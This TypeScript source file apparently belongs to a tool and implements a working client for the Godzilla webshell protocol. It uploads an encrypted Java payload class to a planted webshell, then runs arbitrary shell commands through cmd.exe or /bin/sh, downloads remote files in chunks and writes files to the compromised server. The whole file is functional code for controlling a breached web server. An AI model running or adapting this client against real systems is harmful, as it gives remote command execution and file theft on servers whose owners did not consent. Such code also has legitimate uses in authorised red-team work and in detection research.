/**
 * Godzilla (哥斯拉) protocol client — JavaDynamicPayload.
 *
 * Mirrors the Godzilla client's connect + payload method calls:
 *   xc  = md5(key)[0:16]                      (AES key)
 *   md5 = md5(pass + xc), uppercase           (response wrapper)
 *   1. POST `pass=urlencode(base64(AES(payloadClass)))` — the shell stores the
 *      payload class (static field or http session, hence the cookie relay)
 *   2. POST `pass=urlencode(base64(AES(gzip(serialize({methodName:...})))))`
 *   3. response = md5[0:16] + base64(AES(gzip(result))) + md5[16:32]
 *
 * `Parameter.serialize` format: key bytes + 0x02 + little-endian u32 length +
 * value. Values are raw bytes — the payload does no base64 decoding
 * (`getByteArray` returns them as-is).
 */
import iconv from "iconv-lite";

import { GODZILLA_PAYLOAD_BYTES } from "./assets.js";
import { aesEcbDecrypt, aesEcbEncrypt, gunzipLenient, gzip, md5Hex, md5Key16 } from "./crypto.js";
import { extractCookies, postRaw } from "./http.js";
import {
  buildHeaders,
  type CommonConnectOptions,
  type ConnectTestResult,
  type DownloadResult,
  type ExecResult,
  type TransferResult,
} from "./types.js";

/** Godzilla's `Parameter.serialize`: key bytes + 0x02 + little-endian u32 length + value. */
function serializeParams(params: Array<[string, Buffer]>): Buffer {
  const parts: Buffer[] = [];
  for (const [key, value] of params) {
    const len = Buffer.alloc(4);
    len.writeUInt32LE(value.length, 0);
    parts.push(Buffer.from(key, "utf8"), Buffer.from([0x02]), len, value);
  }
  return Buffer.concat(parts);
}

function encodeBody(pass: string, xc: string, data: Buffer): Buffer {
  const encrypted = aesEcbEncrypt(data, xc).toString("base64");
  return Buffer.from(`${pass}=${encodeURIComponent(encrypted)}`, "utf8");
}

function excerpt(body: Buffer): string {
  const text = body
    .toString("latin1")
    .replace(/[^\x20-\x7e]+/g, " ")
    .trim();
  return text.length > 200 ? `${text.slice(0, 200)}...` : text;
}

function errMsg(err: unknown): string {
  return err instanceof Error ? err.message : String(err);
}

/**
 * Decode payload status/error text. Method results like "ok" and the size
 * digits are ASCII either way, but exception messages go through the
 * payload's `String.getBytes()` — the server's *platform default* charset
 * (UTF-8 on most Linux, GBK on Chinese Windows). Try strict UTF-8 first,
 * fall back to GBK so the user gets a readable reason instead of mojibake.
 * Never used on file content — only on short status/error strings.
 */
function decodeServerText(buf: Buffer): string {
  try {
    return new TextDecoder("utf-8", { fatal: true }).decode(buf);
  } catch {
    try {
      return new TextDecoder("gbk").decode(buf);
    } catch {
      return buf.toString("utf8");
    }
  }
}

/**
 * Encode a remote path for the wire. The payload decodes parameter strings
 * with the server's platform default charset (`new String(bytes)`), so on a
 * non-UTF-8 server (old JDK on Chinese Windows → GBK) a non-ASCII path must
 * be sent in that charset. The user tells us via --remote-charset (probing
 * file.encoding would need getBasicsInfo, whose reverse-DNS lookups can
 * block for tens of seconds — the Godzilla GUI pays the same cost). iconv
 * covers every Java charset label (GBK, MS932, Cp1252, ...); unknown labels
 * degrade to UTF-8. ASCII paths are byte-identical in every charset.
 */
function encodeRemotePath(remotePath: string, remoteCharset: string | undefined): Buffer {
  if (remoteCharset === undefined || /^utf-?8$/i.test(remoteCharset)) {
    return Buffer.from(remotePath, "utf8");
  }
  if (!iconv.encodingExists(remoteCharset)) {
    return Buffer.from(remotePath, "utf8");
  }
  return iconv.encode(remotePath, remoteCharset);
}

interface GodzillaSession {
  /** Invoke a payload method; resolves to the decrypted + gunzipped result. */
  callMethod(methodName: string, extraParams?: Array<[string, Buffer]>): Promise<Buffer>;
}

/**
 * Upload the payload class (request 1) and return an invoker for payload
 * methods (request 2+), bound to the session cookie the shell handed out.
 * Throws on transport errors; `callMethod` throws when the response is not a
 * valid Godzilla envelope.
 */
async function openGodzillaSession(
  url: string,
  pass: string,
  key: string,
  options: CommonConnectOptions = {},
): Promise<GodzillaSession> {
  const xc = md5Key16(key);
  const wrapper = md5Hex(pass + xc).toUpperCase();
  const left = wrapper.slice(0, 16);
  const right = wrapper.slice(16);

  const baseHeaders = buildHeaders(
    { "Content-Type": "application/x-www-form-urlencoded" },
    options,
  );
  const post = (data: Buffer, cookie?: string) =>
    postRaw(url, encodeBody(pass, xc, data), {
      headers: cookie ? { ...baseHeaders, Cookie: cookie } : baseHeaders,
      timeoutMs: options.timeoutMs,
      insecure: options.insecure,
    });

  // ---- request 1: upload the payload class ----
  const initResponse = await post(GODZILLA_PAYLOAD_BYTES);
  const cookies = extractCookies(initResponse.headers);
  const cookie = cookies.length > 0 ? cookies.join("; ") : undefined;

  return {
    async callMethod(methodName: string, extraParams: Array<[string, Buffer]> = []) {
      const callData = gzip(
        serializeParams([["methodName", Buffer.from(methodName, "utf8")], ...extraParams]),
      );
      const res = await post(callData, cookie);
      const text = res.body.toString("latin1");
      const leftIdx = text.indexOf(left);
      const rightIdx = leftIdx === -1 ? -1 : text.indexOf(right, leftIdx + left.length);
      if (leftIdx === -1 || rightIdx === -1) {
        throw new Error(
          `HTTP ${res.status}, response lacks the Godzilla wrapper` +
            (text.trim().length > 0 ? ` (starts with: ${excerpt(res.body)})` : " (empty body)") +
            " — wrong pass/key, missing gate header, or not a Godzilla shell",
        );
      }
      const wrapped = text.slice(leftIdx + left.length, rightIdx);
      try {
        return gunzipLenient(aesEcbDecrypt(Buffer.from(wrapped, "base64"), xc));
      } catch {
        throw new Error("found wrapper but failed to decrypt — wrong key?");
      }
    },
  };
}

export async function testGodzilla(
  url: string,
  pass: string,
  key: string,
  options: CommonConnectOptions = {},
): Promise<ConnectTestResult> {
  const started = Date.now();

  let session: GodzillaSession;
  try {
    session = await openGodzillaSession(url, pass, key, options);
  } catch (err) {
    return {
      ok: false,
      tool: "godzilla",
      url,
      error: errMsg(err),
      durationMs: Date.now() - started,
    };
  }

  let result: string;
  try {
    result = (await session.callMethod("test")).toString("utf8").trim();
  } catch (err) {
    return {
      ok: false,
      tool: "godzilla",
      url,
      error: errMsg(err),
      durationMs: Date.now() - started,
    };
  }

  if (result === "ok") {
    return {
      ok: true,
      tool: "godzilla",
      url,
      detail: `payload uploaded, "test" returned ok`,
      durationMs: Date.now() - started,
    };
  }
  return {
    ok: false,
    tool: "godzilla",
    url,
    error: `decrypted response is ${JSON.stringify(result)}, expected "ok"`,
    durationMs: Date.now() - started,
  };
}

export interface GodzillaExecOptions extends CommonConnectOptions {
  /**
   * Remote OS family, used to pick the shell wrapper (`cmd.exe /c` vs
   * `/bin/sh -c`). "auto" (default) asks the payload's `getBasicsInfo`
   * first — one extra request per exec.
   */
  os?: "auto" | "windows" | "linux";
}

/**
 * Godzilla command execution — invokes the payload's `execCommand` method.
 * The payload runs `Runtime.exec(argv)` (no shell of its own), so the
 * command line is wrapped in `cmd.exe /c` or `/bin/sh -c` here.
 */
export async function execGodzilla(
  url: string,
  pass: string,
  key: string,
  command: string,
  options: GodzillaExecOptions = {},
): Promise<ExecResult> {
  const started = Date.now();
  const fail = (error: string): ExecResult => ({
    ok: false,
    tool: "godzilla",
    url,
    command,
    error,
    durationMs: Date.now() - started,
  });

  let session: GodzillaSession;
  try {
    session = await openGodzillaSession(url, pass, key, options);
  } catch (err) {
    return fail(errMsg(err));
  }

  // ---- optional: detect the remote OS ----
  let os = options.os ?? "auto";
  if (os === "auto") {
    try {
      const info = (await session.callMethod("getBasicsInfo")).toString("utf8");
      const osLine = info.split("\n").find((l) => l.startsWith("OsInfo :")) ?? info;
      os = /os\.name:[^\n]*windows/i.test(osLine) ? "windows" : "linux";
    } catch (err) {
      return fail(errMsg(err));
    }
  }

  // ---- execCommand ----
  const argv =
    os === "windows" ? ["cmd.exe", "/c", command] : ["/bin/sh", "-c", command];
  const params: Array<[string, Buffer]> = [
    ["argsCount", Buffer.from(String(argv.length), "utf8")],
    ...argv.map((arg, i): [string, Buffer] => [`arg-${i}`, Buffer.from(arg, "utf8")]),
  ];
  try {
    const output = await session.callMethod("execCommand", params);
    return {
      ok: true,
      tool: "godzilla",
      url,
      command,
      output: output.toString("utf8"),
      durationMs: Date.now() - started,
    };
  } catch (err) {
    return fail(errMsg(err));
  }
}

/** 1 MiB — the Godzilla client's own big-file block size. */
const DEFAULT_CHUNK = 1024 * 1024;
/** The payload parses position/readByteNum as Java int — no >2 GiB files. */
const MAX_REMOTE_SIZE = 0x7fffffff;
/** Per-chunk attempts; offset-based writes/reads are idempotent, so retry is safe. */
const CHUNK_ATTEMPTS = 3;

export interface GodzillaTransferOptions extends CommonConnectOptions {
  /** Chunk size for the big-file transfer loop (default 1 MiB). */
  chunkSize?: number;
  /**
   * Charset of the remote JVM's platform default encoding (any Java label —
   * "GBK", "MS932", ...), used to encode non-ASCII remote paths. Default
   * UTF-8 (correct on JDK 18+ and virtually all Linux servers).
   */
  remoteCharset?: string;
}

function fileParams(pathBytes: Buffer, extra: Array<[string, Buffer]>): Array<[string, Buffer]> {
  return [["fileName", pathBytes], ...extra];
}

/**
 * Godzilla file download — the payload's `bigFileDownload` method:
 *   mode=fileSize -> decimal ASCII size   (File.length(); 0 for missing files!)
 *   mode=read     -> up to readByteNum raw bytes starting at position
 * A chunk is accepted iff `chunk.length == readByteNum` (full read) or
 * `chunk.length + downloaded == fileSize` (short read at EOF) — the same
 * criterion the Godzilla client uses; anything else is the payload's error
 * text ("Exception errMsg:..."), never file content to keep.
 */
export async function downloadGodzilla(
  url: string,
  pass: string,
  key: string,
  remotePath: string,
  options: GodzillaTransferOptions = {},
): Promise<DownloadResult> {
  const started = Date.now();
  const fail = (error: string): DownloadResult => ({
    ok: false,
    tool: "godzilla",
    url,
    direction: "download",
    remotePath,
    error,
    durationMs: Date.now() - started,
  });

  let session: GodzillaSession;
  try {
    session = await openGodzillaSession(url, pass, key, options);
  } catch (err) {
    return fail(errMsg(err));
  }
  const pathBytes = encodeRemotePath(remotePath, options.remoteCharset);

  // ---- size probe ----
  let sizeText: string;
  try {
    sizeText = decodeServerText(
      await session.callMethod(
        "bigFileDownload",
        fileParams(pathBytes, [
          ["mode", Buffer.from("fileSize")],
          ["position", Buffer.from("0")],
          ["readByteNum", Buffer.from("0")],
        ]),
      ),
    ).trim();
  } catch (err) {
    return fail(errMsg(err));
  }
  if (!/^\d+$/.test(sizeText)) {
    return fail(`cannot get remote file size — server said: ${JSON.stringify(sizeText)}`);
  }
  const size = Number.parseInt(sizeText, 10);
  if (size > MAX_REMOTE_SIZE) {
    return fail(
      `remote file is ${size} bytes — the Godzilla payload cannot handle files over 2 GiB`,
    );
  }

  // ---- chunked read ----
  // A zero-byte size still gets one probe read: File.length() is 0 both for
  // "exists and empty" and for "does not exist". A read with readByteNum=0
  // tells them apart — the payload's read(byte[0]) returns 0 bytes (success)
  // for an existing file, while a missing file throws FileNotFoundException
  // in the FileInputStream constructor (an "Exception errMsg:..." string
  // that fails the acceptance criterion below). Note readByteNum>0 at EOF
  // makes the payload fail with "Exception errMsg:-1" (NegativeArraySize),
  // so the probe must ask for exactly 0 bytes.
  const chunkSize = options.chunkSize ?? DEFAULT_CHUNK;
  const parts: Buffer[] = [];
  let downloaded = 0;
  for (;;) {
    if (size > 0 && downloaded >= size) break;
    if (size === 0 && parts.length > 0) break;

    const want = size === 0 ? 0 : Math.min(chunkSize, size - downloaded);
    let chunk: Buffer | null = null;
    let serverSays = "";
    for (let attempt = 1; attempt <= CHUNK_ATTEMPTS && chunk === null; attempt++) {
      try {
        const res = await session.callMethod(
          "bigFileDownload",
          fileParams(pathBytes, [
            ["mode", Buffer.from("read")],
            ["position", Buffer.from(String(downloaded))],
            ["readByteNum", Buffer.from(String(want))],
          ]),
        );
        if (res.length === want || res.length + downloaded === size) {
          chunk = res;
        } else {
          serverSays = decodeServerText(res).trim();
        }
      } catch (err) {
        serverSays = errMsg(err);
      }
    }
    if (chunk === null) {
      return fail(
        `read failed at offset ${downloaded}/${size} — server said: ${JSON.stringify(serverSays)}`,
      );
    }
    parts.push(chunk);
    downloaded += chunk.length;
  }

  const data = Buffer.concat(parts);
  if (data.length !== size) {
    return fail(
      `incomplete download: got ${data.length} of ${size} bytes — the file changed during transfer?`,
    );
  }
  return {
    ok: true,
    tool: "godzilla",
    url,
    direction: "download",
    remotePath,
    bytes: data.length,
    data,
    durationMs: Date.now() - started,
  };
}

/**
 * Godzilla file upload.
 * Small files (≤ chunkSize) go in one `uploadFile` call (truncate + write —
 * the payload's whole-file method, same as the Godzilla client's normal
 * upload). Bigger files use `bigFileUpload` with an absolute `position`
 * (RandomAccessFile seek + write, idempotent → safe per-chunk retry).
 * Afterwards the remote size is verified via `bigFileDownload mode=fileSize`.
 */
export async function uploadGodzilla(
  url: string,
  pass: string,
  key: string,
  remotePath: string,
  data: Buffer,
  options: GodzillaTransferOptions = {},
): Promise<TransferResult> {
  const started = Date.now();
  const fail = (error: string): TransferResult => ({
    ok: false,
    tool: "godzilla",
    url,
    direction: "upload",
    remotePath,
    error,
    durationMs: Date.now() - started,
  });

  let session: GodzillaSession;
  try {
    session = await openGodzillaSession(url, pass, key, options);
  } catch (err) {
    return fail(errMsg(err));
  }
  const pathBytes = encodeRemotePath(remotePath, options.remoteCharset);

  const chunkSize = options.chunkSize ?? DEFAULT_CHUNK;
  if (data.length <= chunkSize) {
    let text: string;
    try {
      text = decodeServerText(
        await session.callMethod("uploadFile", fileParams(pathBytes, [["fileValue", data]])),
      ).trim();
    } catch (err) {
      return fail(errMsg(err));
    }
    if (text !== "ok") {
      return fail(`server said: ${JSON.stringify(text)}`);
    }
  } else {
    let offset = 0;
    while (offset < data.length) {
      const chunk = data.subarray(offset, Math.min(offset + chunkSize, data.length));
      let ok = false;
      let serverSays = "";
      for (let attempt = 1; attempt <= CHUNK_ATTEMPTS && !ok; attempt++) {
        try {
          const res = await session.callMethod(
            "bigFileUpload",
            fileParams(pathBytes, [
              ["fileContents", chunk],
              ["position", Buffer.from(String(offset))],
            ]),
          );
          serverSays = decodeServerText(res).trim();
          ok = serverSays === "ok";
        } catch (err) {
          serverSays = errMsg(err);
        }
      }
      if (!ok) {
        return fail(
          `upload failed at offset ${offset}/${data.length} — server said: ${JSON.stringify(serverSays)}`,
        );
      }
      offset += chunk.length;
    }
  }

  // ---- verify the remote size matches ----
  try {
    const sizeText = decodeServerText(
      await session.callMethod(
        "bigFileDownload",
        fileParams(pathBytes, [
          ["mode", Buffer.from("fileSize")],
          ["position", Buffer.from("0")],
          ["readByteNum", Buffer.from("0")],
        ]),
      ),
    ).trim();
    if (!/^\d+$/.test(sizeText) || Number.parseInt(sizeText, 10) !== data.length) {
      return fail(
        `upload finished but remote size mismatch — sent ${data.length} bytes, server said: ${JSON.stringify(sizeText)}`,
      );
    }
  } catch (err) {
    return fail(`upload finished but size verification failed: ${errMsg(err)}`);
  }

  return {
    ok: true,
    tool: "godzilla",
    url,
    direction: "upload",
    remotePath,
    bytes: data.length,
    durationMs: Date.now() - started,
  };
}
